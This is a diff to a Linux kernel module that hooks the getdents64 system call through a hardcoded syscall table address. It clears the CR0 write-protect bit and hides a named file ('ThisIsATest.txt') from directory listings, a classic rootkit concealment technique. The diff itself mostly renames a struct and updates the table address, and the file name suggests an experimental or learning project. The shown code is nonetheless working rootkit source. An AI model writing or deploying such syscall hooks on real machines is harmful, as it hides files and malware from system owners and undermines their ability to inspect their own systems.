@@ -1,14 +1,12 @@
 #include <linux/module.h>
 #include <linux/dirent.h>
 #include <asm/cacheflush.h>
-#include <asm/ptrace.h>
 #include <linux/uaccess.h>
  
-int new_getdents64(const struct pt_regs *regs);
 int load(void);
 void unload(void);
 
-struct pt_regs {
+struct pt_regs_x86 {
 /*
  * C ABI says these regs are callee-preserved. They aren't saved on kernel entry
  * unless syscall needs a complete, fully filled "struct pt_regs".
@@ -43,8 +41,8 @@ struct pt_regs {
 /* top of stack page */
 };
 
-typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs *regs);
-static unsigned long *syscall_table = (unsigned long *)0xffffffff842001a0; 
+typedef asmlinkage int (*original_getdents64_t)(const struct pt_regs_x86 *regs);
+static unsigned long *syscall_table = (unsigned long *)0xffffffffb3a001a0; 
 static original_getdents64_t original_getdents64_ptr;
 static char *file_name_to_hide = "ThisIsATest.txt";
  
@@ -62,7 +60,7 @@ static inline void one_cr0(void) {
     wp_cr0(read_cr0() | 0x10000);
 }
 
-asmlinkage int new_getdents64(const struct pt_regs *regs) {
+asmlinkage int new_getdents64(const struct pt_regs_x86 *regs) {
     int total_bytes_read = (int)original_getdents64_ptr(regs);
     struct linux_dirent64 *buff = (struct linux_dirent64*)((char*)regs->rsi);
 
